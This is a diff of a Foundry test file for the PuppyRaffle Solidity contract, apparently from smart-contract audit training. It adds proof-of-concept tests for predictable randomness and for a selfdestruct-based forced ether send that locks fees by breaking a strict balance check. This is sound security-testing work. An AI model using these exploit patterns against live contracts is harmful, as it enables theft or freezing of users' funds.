@@ -6,7 +6,6 @@ import {Test, console} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
 import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
 
-
 contract PuppyRaffleTest is Test {
     PuppyRaffle puppyRaffle;
     uint256 entranceFee = 1e18;
@@ -275,18 +274,50 @@ contract PuppyRaffleTest is Test {
         vm.warp(1678989);
         //console.log(block.timestamp);
         vm.prevrandao(bytes32(uint(25)));
-       // console.log(block.difficulty);
+        // console.log(block.difficulty);
         uint winningIndexManipulated = uint256(
             keccak256(
                 abi.encodePacked(msg.sender, block.timestamp, block.difficulty)
             )
         ) % players.length;
-         string memory maliciousMinerIndex = puppyRaffle.getActivePlayerIndex(
+        string memory maliciousMinerIndex = puppyRaffle.getActivePlayerIndex(
             maliciousMiner
         );
-        address x= puppyRaffle.players(4);
-        console.log(x, maliciousMiner,playerOne);
-        assertEq(maliciousMinerIndex, Strings.toString(winningIndexManipulated));
+        address x = puppyRaffle.players(4);
+        console.log(x, maliciousMiner, playerOne);
+        assertEq(
+            maliciousMinerIndex,
+            Strings.toString(winningIndexManipulated)
+        );
+    }
+
+    function test_DangerousEqualities() public {
+        DangerousEqualities DContract = new DangerousEqualities(puppyRaffle);
+        address attacker = makeAddr("attacker");
+        vm.deal(attacker, 2 ether);
+        vm.startPrank(attacker);
+        DContract.attack{value: 2 ether}();
+        vm.stopPrank();
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+
+        //not the same, hence the revert
+        console.log(address(puppyRaffle).balance);
+        console.log(puppyRaffle.totalFees());
+      
+    }
+}
+
+contract DangerousEqualities {
+    PuppyRaffle _puppyRaffle;
+
+    constructor(PuppyRaffle puppyRaffle) {
+        _puppyRaffle = puppyRaffle;
+    }
+
+    function attack() public payable {
+        address payable malicious = payable(address(_puppyRaffle));
+        selfdestruct(malicious);
     }
 }
 
